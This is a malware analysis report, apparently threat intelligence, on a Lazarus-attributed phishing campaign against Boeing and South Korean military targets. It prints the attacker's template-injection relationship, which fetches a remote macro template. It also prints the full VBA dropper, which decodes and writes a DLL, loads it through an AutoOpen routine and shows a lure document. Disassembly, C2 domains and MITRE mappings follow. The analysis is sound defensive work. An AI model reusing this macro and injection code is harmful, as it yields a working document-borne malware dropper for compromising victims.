## Operation Flash Cobra
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Threat intelligence](#TI)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [Articles](#Articles)
<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is a maldoc using a template injection for download and execute the next stager.</h6>

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://od.lk/d/MzBfMjA1Njc0ODdf/pubmaterial.dotm" TargetMode="External"/>
</Relationships>
```

<h6>The second stager use a document with a macro. The first block define the alias functions for the rest of the script.</h6>

```vb
Private Declare PtrSafe Function CoContentInfo Lib "onenote.db" (ByVal lpDocPath As String, ByVal lpPass As String, ByVal lpUID As String) As Long
Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As LongPtr
```

<h6>The next three functions give the abilities to create a new folder, check the existence of a file and folder.</h6>

```vb
Function MkDir(szDir)
 On Error Resume Next
 MkDir = CreateObject("Scripting.FileSystemObject").CreateFolder(szDir)
End Function
Function FileExist(szFile)
 On Error Resume Next
 FileExist = CreateObject("Scripting.FileSystemObject").FileExists(szFile)
End Function
Function FolderExist(szFolder)
 On Error Resume Next
 FolderExist = CreateObject("Scripting.FileSystemObject").FolderExists(szFolder)
End Function
```

<h6>The following block of functions allows to decode the stream in base 64, that used on the next declared functions.</h6>

```vb
Function Stream_BinaryToString(Binary)
 On Error Resume Next
 Const adTypeText = 2
 Const adTypeBinary = 1
 Dim BinaryStream 'As New Stream
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = adTypeBinary
 BinaryStream.Open
 BinaryStream.Write Binary
 BinaryStream.Position = 0
 BinaryStream.Type = adTypeText
 BinaryStream.Charset = "us-ascii"
 Stream_BinaryToString = BinaryStream.ReadText
 Set BinaryStream = Nothing
End Function

Function Base64DecodeToBinary(ByVal vCode)
 On Error Resume Next
 Dim oXML, oNode
 Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
 Set oNode = oXML.CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.Text = vCode
 Base64DecodeToBinary = oNode.nodeTypedValue
 Set oNode = Nothing
 Set oXML = Nothing
End Function

Function Base64DecodeToString(ByVal vCode)
 On Error Resume Next
 Dim oXML, oNode
 Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
 Set oNode = oXML.CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.Text = vCode
 Base64DecodeToString = Stream_BinaryToString(oNode.nodeTypedValue)
 Set oNode = Nothing
 Set oXML = Nothing
End Function
```
<h6>This block of function extracts the dll in function of the architecture (X86 or X64), the lure document for the victim all on the path pushed in argument.</h6>

```vb
Sub ExtractDll(dllPath)
 On Error Resume Next
 Set objStream = CreateObject("ADODB.Stream")
 objStream.Type = 1
 objStream.Open
#If Win64 Then
 objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label1.Caption))
#Else
 objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label2.Caption))
#End If
 objStream.SaveToFile dllPath, 2
 Set objStream = Nothing
End Sub

Sub ExtractDoc(docPath)
 On Error Resume Next
 Set objStream = CreateObject("ADODB.Stream")
 objStream.Type = 1
 objStream.Open
 objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label3.Caption))
 objStream.SaveToFile docPath, 2
 Set objStream = Nothing
End Sub
```

<h6>We can note that the functions used for the name generation give a name based on the current path of the dotm file but like a dll, this check if the files already exist and rename it, this avoids to throw errors on the victim. We can also see that the same part of a common path used for store the dll continue to be used on their operation (\AppData\Local\Microsoft\).</h6>

```vb
Function GetDocName() As String
 On Error Resume Next
 curDocNameFull = ActiveDocument.Path & "\" & ActiveDocument.Name
 curDocName = Left(curDocNameFull, InStrRev(curDocNameFull, ".") - 1)
 newDocNameFull = curDocName & " .doc"
 Do While FileExist(newDocNameFull)
  curDocName = curDocName & " "
  newDocNameFull = curDocName & " .docx"
 Loop
 GetDocName = newDocNameFull
End Function

Function GetDllName() As String
 On Error Resume Next
 Dim dllPath As String
 workDir = Environ("UserProfile") & "\AppData\Local\Microsoft\OneNote"
 If Not FolderExist(workDir) Then
  MkDir (workDir)
 End If
 dllPath = workDir & "\onenote.db"
 nIdx = 0
 Do While FileExist(dllPath)
  workDir = workDir & "\Modules"
  If Not FolderExist(workDir) Then
   MkDir (workDir)
  End If
  dllPath = workDir & "\onenote.db"
 Loop
 GetDllName = dllPath
End Function
```

<h6>The final part is the autoopen method for execute the macro at the beginning of the document, extract the lure and the dll, give their names and execute dll in passing the lure document in argument for show it to the victim.</h6>

```vb
Sub AutoOpen()
 On Error Resume Next
 Application.Visible = False
 dllPath = GetDllName()
 docPath = GetDocName()
 orgDocPath = ActiveDocument.Path & "\" & ActiveDocument.Name
 ExtractDll (dllPath)
 ExtractDoc (docPath)
 LoadLibraryA (dllPath)
 a = CoContentInfo(orgDocPath, "S-6-38-4412-76700627-315277-3247", "18")
 Dim objDocApp
 Set objDocApp = CreateObject("Word.Application")
 objDocApp.Visible = True
 objDocApp.Documents.Open docPath
 Application.Quit (wdDoNotSaveChanges)
End Sub
```

<h6>Liking supposed on the argument for launch the dll, this used the dll sqlite3 for parsing the SQLite databases and extract the informations. Each version released of the sqlite3.dll content a tracker for getting, the time of the build and the hash relative at this build (here on the X86 version).</h6>

```asm
6: sym.sqlite3_32.dll_sqlite3_sourceid ();
0x1006ad65 mov eax, str.2020_01_27_19:55:54_3bfa9cc97da10598521b342961df8f5f68c7388fa117345eeb516eaa837bb4d6 ; 0x1008a298 ; "2020-01-27 19:55:54 3bfa9cc97da10598521b342961df8f5f68c7388fa117345eeb516eaa837bb4d6"
0x1006ad6a ret
```

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/Version.PNG"> </img></center>


###### The launch of the dll is ensured by the creation of a new thread and a rundll32 call.

```asm
0x10006cf5 push ebx      ; LPDWORD lpThreadId
0x10006cf6 push ebx      ; DWORD dwCreationFlags
0x10006cf7 push dword [var_518h] ; LPVOID lpParameter
0x10006cfd push 0x10006bc7    ; LPTHREAD_START_ROUTINE lpStartAddress
0x10006d02 push ebx      ; SIZE_T dwStackSize
0x10006d03 push ebx      ; LPSECURITY_ATTRIBUTES lpThreadAttributes
0x10006d04 call dword [sym.imp.KERNEL32.dll_CreateThread] ; 0x1007d088 ; HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
0x10006d0a push edi      ; DWORD nSize
0x10006d0b lea eax, [var_108h]
0x10006d11 push eax      ; LPSTR lpFilename
0x10006d12 push 0x10000000    ; HMODULE hModule
0x10006d17 call dword [sym.imp.KERNEL32.dll_GetModuleFileNameA] ; 0x1007d070 ; DWORD GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
0x10006d1d push dword [var_50ch]
0x10006d23 lea eax, [var_108h]
0x10006d29 push esi
0x10006d2a push eax      ; int32_t arg_ch
0x10006d2b mov ebx, 0x200     ; 512
0x10006d30 push str.C:__Windows__System32___undll32.exe___s___CMS_ContentInfo__s_0_0__s_1 ; 0x10087760 ; "C:\Windows\System32\rundll32.exe \"%s\", CMS_ContentInfo %s 0 0 %s 1" ; int32_t arg_8h
0x10006d35 mov ecx, ebx
0x10006d37 lea edi, [var_508h]
0x10006d3d call fcn.10005f89
0x10006d42 lea eax, [var_510h]
0x10006d48 push eax      ; int32_t arg_ch
0x10006d49 mov eax, edi
0x10006d4b push eax      ; LPSTR lpCommandLine
0x10006d4c call Startup
0x10006d51 push dword [var_50ch]
0x10006d57 lea eax, [var_108h]
0x10006d5d push esi
0x10006d5e push eax      ; int32_t arg_ch
0x10006d5f push str.s___CMS_ContentInfo__s_0_0__s_1 ; 0x100877a4 ; "\"%s\", CMS_ContentInfo %s 0 0 %s 1" ; int32_t arg_8h
```

<h6>The implant pushes the persistence in using the startup folder created by the dotm file. The Lazarus group continue to use the name of the products of Microsoft company as lure for the victim as lnk file.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/Persistence.png"></img></center>

###### The malware in more parse the SQLite database, use the function ```sqlite3_win32_is_nt```of the dll sqlite3 for getting the OS version of the victim.

```asm
0x1000ecbd call sqlite3_win32_is_nt_sqlite
0x1000ecc2 xor edx, edx
0x1000ecc4 pop ecx
0x1000ecc5 pop ecx
0x1000ecc6 cmp esi, edx
0x1000ecc8 jne 0x1000eccf
0x1000ecca mov esi, 0x10089dd9
0x1000eccf xor eax, eax
0x1000ecd1 cmp byte [var_200h], dl
0x1000ecd7 je 0x1000ecf4
0x1000ecd9 mov cl, byte [ebp + eax - 0x200]
0x1000ece0 cmp cl, 0xd   ; 13
0x1000ece3 je 0x1000ecf4
0x1000ece5 cmp cl, 0xa   ; 10
0x1000ece8 je 0x1000ecf4
0x1000ecea inc eax
0x1000eceb cmp byte [ebp + eax - 0x200], dl
0x1000ecf2 jne 0x1000ecd9
0x1000ecf4 mov byte [ebp + eax - 0x200], dl
0x1000ecfb lea eax, [var_200h]
0x1000ed01 push eax
0x1000ed02 push esi
0x1000ed03 push edi
0x1000ed04 push ebx
0x1000ed05 push dword [arg_ch]
0x1000ed08 push str.os_win.c:_d:___lu___s__s_____s ; 0x1008be80 ; "os_win.c:%d: (%lu) %s(%s) - %s"
0x1000ed0d push dword [arg_8h]
0x1000ed10 call sym.sqlite3_32.dll_sqlite3_log
0x1000ed15 mov ecx, dword [var_4h]
0x1000ed18 mov eax, dword [arg_8h]
0x1000ed1b add esp, 0x1c
0x1000ed1e pop esi
0x1000ed1f xor ecx, ebp
0x1000ed21 pop ebx
0x1000ed22 call Test-Debug
0x1000ed27 leave
0x1000ed28 ret
```

<h6>Once this did, this executes the main function for getting the system informations.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/Get-Infos.png"> </img></center>

###### For getting the process running on the computer, the malware use the common method ```CreateToolhelp32Snapshot``` for create a snapshot of all the process and parse for have the modules and informations. 

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/process.png"> </img></center>

###### Like for the process, this use the common methods by API (```GetLogicalDrives```, ```GetDriveTypeW```, ```GetDiskFreeSpaceExW```) for getting the informations on the disks and volumes present on the computer (Logical, space ...).

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/Get-DiskInfo.png"> </img></center>

###### After regrouping all the data. This push the header with the common header for Mozilla in finding it by the method ```ObtainUserAgentString``` (this gives the header in searching with a predefined profile, here Mozilla).

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/PushHeader.png"> </img></center>

<h6>Once this done, send the data by a POST request to the C2.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/SendData.png"> </img></center>

<h6>For all the samples, this is the same TTPs used by the Lazarus group. On compare the date of creation, modification, template and the users, we can note that all grouped for one common operation.</h6>
<center>
<table>
<tr>
<th>Filename</th>
<th>Creation date</th>
<th>Last modified date</th>
<th>Creator</th>
<th>Last user</th>
<th>Template</th>
<th>Application</th>
</tr>
<tr>
<td>US-ROK Relations and Diplomatic Security.docx</td>
<td>2020-04-06 08:47:00</td>
<td>2020-04-06 08:49:00</td>
<td>JangSY</td>
<td>user</td>
<td>ApothecaryLetter.dotx</td>
<td>Microsoft Office Word 16</td>
</tr>
<tr>
<td>pubmaterial.dotm</td>
<td>2020-04-06 08:12:00</td>
<td>2020-04-06 08:12:00</td>
<td>user</td>
<td>user</td>
<td>Normal.dotm</td>
<td>Microsoft Office Word 16</td>
</tr>
<tr>
<td>Boeing_PMS.docx</td>
<td>2020-04-06 08:47:00</td>
<td>2020-04-06 08:49:00</td>
<td>JangSY</td>
<td>user</td>
<td>ApothecaryLetter.dotx</td>
<td>Microsoft Office Word 16</td>
</tr>
<tr>
<td>43.dotm</td>
<td>2020-04-13 18:42:00</td>
<td>2020-04-24 05:36:00</td>
<td>User</td>
<td>User</td>
<td>43.dotm</td>
<td>Microsoft Office Word 16</td>
</tr>
<tr>
<td>Boeing_DSS_SE.docx</td>
<td>2020-04-13 18:44:00</td>
<td>2020-04-28 23:08:00</td>
<td>Windows User</td>
<td>Windows User</td>
<td>17122A7A.htm</td>
<td>Microsoft Office Word 16</td>
</tr>
<tr>
<td>17.dotm</td>
<td>2020-04-13 18:42:00</td>
<td>2020-04-28 23:19:00</td>
<td>User</td>
<td>Windows User</td>
<td>17.dotm</td>
<td>Microsoft Office Word 16</td>
</tr>
</table></center>

<h6>The infrastructure of the C2 reuse again windows server, the same management panel of the IIS web server, all C2 are up since early February 2020.</h6>
<center>
<table>
<tr>
<th>Domain</th>
<th>Panel</th>
<th>Webserver</th>
<th>OS</th>
</tr>
<tr>
<td>elite4print.com</td>
<td>PleskWin</td>
<td>Microsoft-IIS/7.5</td>
<td>Windows Server 2008 R2</td>
</tr>
<tr>
<td>astedams.it</td>
<td>PleskWin</td>
<td>Microsoft-IIS/10.0</td>
<td>Windows Server 2016</td>
</tr>
</table></center>

<h2> Threat intelligence <a name="TI"></a></h2>
<h3>Boeing</h3>
<h6>The choice of the attack of the airbus is logical by the actualities on the Boeing group. With the COVID-19 event, the business with the possible customers become more harder, that an additional problem when we had the problem with the Boeing 737 MAX banned from flying following numerous crashes. The direction of the group has announced the possible massive cuts of jobs in the company. The group was to make the setting of priorities with these military and civil appliances and the communication of the economic result of the first quarter of the year 2020. On these tensions, it is obvious that the parts of the Human resources were knowingly targeted by pretending a possible job or communication for the staff.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/Boeing.png"></img></center>
<h6>We can hypothesize about the target groups:
<ul>
<li>Research center in the Republic of Korea (Boeing Military)</li>
<li>Boeing Defense, Space & Security</li>
</ul></h6>
<h3>Korean Army</h3>
<h6>April 2020 have been a full month in events on the ROK, despite the reduction in costs with events related to COVID-19 in the military events, the south korean airforce have planned to upgrade the actual F-16 and F-35 fleet for theirs operational support and equipment. An event for joint drill operation with the US air force was previously planned have been canceled due to the COVID-19 restriction.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/ROK-AIR-1.png"></img></center>
<h6>This event has been used to become familiar with the recently arrived RQ-4 drones from South Korea. This improvement precedes the firing of short-range missiles a few days before the start of discussions about the elections in South Korea.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/ROK-AIR-2.png"></img></center>
<h6>This event with also impacted the modification of the measures to protect tanks of the South Korean army, information that is interested in North Korea in the light of recent phishing campaigns in the land forces.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/ROK-Tank.png"></img></center>
<h6>Likewise, recent changes have taken place in the South Korean Navy with the change of chief of naval operations to the hands with the new minesweeper ship and upgrade of Destroyers for the adapt the response of the threats to South Korea (Korea south, China ...). So many changes that attract the lusts of North Korea to learn more from the measures taken by South Korea. However, it can't be excluded that other countries are very interested in these famous measures such as China, which borders with North Korea and in these economic zones with South Korea.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/ROK-Navy.png"></img></center>


<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain used by the attacker.</h6>
<center>
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/2020-05-05/Pictures/killchain.png"></img>
</center>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/2020-05-05/JSON/IOC-Lazarus_2020_05_05.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/2020-05-05/CSV/IOC-Lazarus_2020_05_05.csv">CSV</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Rundll32<br>Execution through Module Load|https://attack.mitre.org/techniques/T1085<br>https://attack.mitre.org/techniques/T1129|
|Persistence|Registry Run Keys / Startup Folder|https://attack.mitre.org/techniques/T1060|
|Credential Access|Credentials in Files|https://attack.mitre.org/techniques/T1081|
|Defense Evasion|Rundll32|https://attack.mitre.org/techniques/T1085|
|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012|

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/2020-05-05/JSON/Mitre-Lazarus_2020_05_05.json">Export in JSON</a></h6>

<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>
<ul>
<li><a href="https://twitter.com/RedDrip7/status/1252433519046832129">https://twitter.com/RedDrip7/status/1252433519046832129</a></li>
<li><a href="https://twitter.com/Timele9527/status/1253941585026314240">https://twitter.com/Timele9527/status/1253941585026314240</a></li>
<li><a href="https://twitter.com/DeadlyLynn/status/1257504361577496576">https://twitter.com/DeadlyLynn/status/1257504361577496576</a></li>
</ul>

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>
<ul>
<li><a href="https://app.any.run/tasks/37c58521-d796-48e9-abf8-1b87dd9403cf">Boeing_DSS_SE.docx</a></li>
<li><a href="https://app.any.run/tasks/4f0880e4-9d4f-40e0-8801-2b1d909d7abe">17.dotm</a></li>
<li><a href="https://app.any.run/tasks/f92799a0-337f-4565-b8ff-b45cb334363e">Boeing_PMS.docx</a></li>
<li><a href="https://app.any.run/tasks/762535a2-6bea-42c6-a8bc-b01915bfbe7d">43.dotm</a></li>
<li><a href="https://app.any.run/tasks/51a1296a-3a1a-4e47-9e59-27939f110b12">US-ROK Relations and Diplomatic Security.docx</a></li>
</ul>

<h6> Articles <a name="Articles"></a></h6>
<ul>
<li><a href="https://www.bbc.com/news/business-52468882">Coronavirus: Boeing to cut 15,000 jobs in 'body blow'</a></li>
<li><a href="https://investors.boeing.com/investors/investor-news/press-release-details/2020/Boeing-Terminates-Agreement-to-Establish-Joint-Ventures-with-Embraer/default.aspx">Boeing Terminates Agreement to Establish Joint Ventures with Embraer</a></li>
<li><a href="https://www.nknews.org/2020/04/u-s-and-rok-to-wrap-up-joint-air-drills-held-this-week-says-seoul/">South Korea, U.S. wrap up combined joint air force exercises: MND</a></li>
<li><a href="https://thediplomat.com/2020/04/south-koreas-army-plans-to-upgrade-k1a2-main-battle-tank/">South Korea’s Army Plans to Upgrade K1A2 Main Battle Tank</a></li>
<li><a href="https://www.navalnews.com/naval-news/2020/04/new-chief-of-naval-operations-for-the-republic-of-korea-navy/">New Chief of Naval Operations for the Republic of Korea Navy</a></li>
<li><a href="https://navyrecognition.com/index.php/news/defence-news/2020/april-2020/8280-navy-of-south-korea-has-launched-4th-yangyang-class-minesweeper-ship-namhae-msh-575.html">Navy of South Korea has launched 4th Yangyang-class minesweeper ship Namhae MSH-575</a></li>
<li><a href="https://navyrecognition.com/index.php/news/defence-news/2020/april-2020/8322-rok-ministry-of-national-defense-releases-video-footages-of-ddh-ii-class-destroyers.html">ROK Ministry of National Defense releases video footages of DDH-II Class Destroyers</a></li>
<li><a href="https://www.nytimes.com/2020/04/14/world/asia/north-korea-fires-missiles.html">North Korea Fires Missiles as South’s Elections Loom</a></li>
</ul>
